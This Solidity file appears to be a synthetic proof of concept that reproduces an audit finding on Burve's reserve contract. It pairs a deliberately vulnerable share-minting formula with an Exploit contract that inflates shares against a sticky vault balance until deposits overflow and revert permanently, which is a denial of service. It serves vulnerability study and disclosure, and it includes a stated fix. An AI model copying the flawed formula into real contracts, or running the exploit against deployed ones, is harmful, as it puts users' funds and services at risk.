// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Burve ReserveLib — Reserve share overflow via rounding (Sherlock; #56958)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: ReserveLib.deposit mints
        shares = (balance == 0) ? amount * SHARE_RESOLUTION
                                : (amount * reserve.shares[idx]) / balance;
    When amount > 0 but the observed vault balance is tiny / unchanged by dust
    (finding: residual too small to move vault balance meaningfully), the ratio
    inflates shares. Repeated cycles push reserve.shares past uint256 max
    → overflow panic → every trim/deposit path reverts → DoS.

    Finding quote (Reserve.sol @ 44cba36):
        shares = (balance == 0)
            ? amount * SHARE_RESOLUTION
            : (amount * reserve.shares[idx]) / balance;
        reserve.shares[idx] += shares;

    FIX: enforce a minimum balance/amount before minting reserve shares.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "TKN";
    string public symbol = "TKN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Vault with sticky observed balance — dust does not update it.
contract Vault {
    MockERC20 public immutable asset;
    uint256 public observedBalance;

    constructor(MockERC20 a) {
        asset = a;
    }

    function balance() external view returns (uint256) {
        return observedBalance;
    }

    function deposit(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        if (observedBalance == 0) {
            observedBalance = amount;
        }
        // else: dust path — observed balance sticky (setObserved keeps it tiny)
    }

    function setObserved(uint256 b) external {
        observedBalance = b;
    }
}

/// @dev Reserve that pulls tokens from the caller; vulnerable mint formula.
contract DustReserve {
    uint8 public constant SHARE_RESOLUTION = 100;
    Vault public vault;
    MockERC20 public token;
    uint256 public shares;

    constructor(Vault v, MockERC20 t) {
        vault = v;
        token = t;
    }

    function deposit(uint256 amount) external returns (uint256 minted) {
        uint256 balance = vault.balance();
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(address(vault), amount);
        vault.deposit(amount);

        if (balance == 0) {
            minted = amount * uint256(SHARE_RESOLUTION);
        } else {
            // @> VULN: tiny balance + nonzero amount inflates shares without bound
            minted = (amount * shares) / balance; // @> VULN
            // FIX: require(amount >= minDeposit && balance >= minBalance);
        }
        shares += minted; // finding panics here when inflated past uint256 max
    }
}

/// @dev Inflate shares against sticky balance=1 until deposit overflows → DoS.
contract Exploit {
    MockERC20 public token; // CREATE 1
    Vault public vault; // CREATE 2
    DustReserve public reserve; // CREATE 3 — vulnerable

    uint256 public finalShares;
    bool public overflowDoS;

    constructor() {
        token = new MockERC20();
        vault = new Vault(token);
        reserve = new DustReserve(vault, token);
    }

    function run() external {
        // Huge balance for large dust deposits (no totalSupply cap)
        token.mint(address(this), type(uint256).max);
        token.approve(address(reserve), type(uint256).max);

        // 1. Seed: amount=1 → shares=100, observed=1
        reserve.deposit(1);
        require(reserve.shares() == 100, "init shares");
        require(vault.balance() == 1, "init bal");

        // 2. Keep observed balance at 1 (dust doesn't move vault accounting)
        vault.setObserved(1);

        // Inflate almost to max: amount = (type(uint256).max / 2) / 100
        // minted = amount * 100 / 1 = max/2; shares = 100 + max/2
        uint256 amount = (type(uint256).max / 2) / 100;
        reserve.deposit(amount);
        vault.setObserved(1);
        finalShares = reserve.shares();
        require(finalShares > type(uint256).max / 3, "inflated");

        // 3. Same-size deposit overflows shares += minted
        bool overflowed;
        try reserve.deposit(amount) {
            overflowed = false;
        } catch {
            overflowed = true;
        }
        require(overflowed, "expected overflow panic");

        // 4. DoS persists: state rolled back to inflated shares; next attempt still panics
        bool stillBroken;
        try reserve.deposit(amount) {
            stillBroken = false;
        } catch {
            stillBroken = true;
        }
        require(stillBroken, "still DoS");
        overflowDoS = true;
        finalShares = reserve.shares();
        require(overflowDoS && finalShares > type(uint256).max / 3, "harm");
    }
}
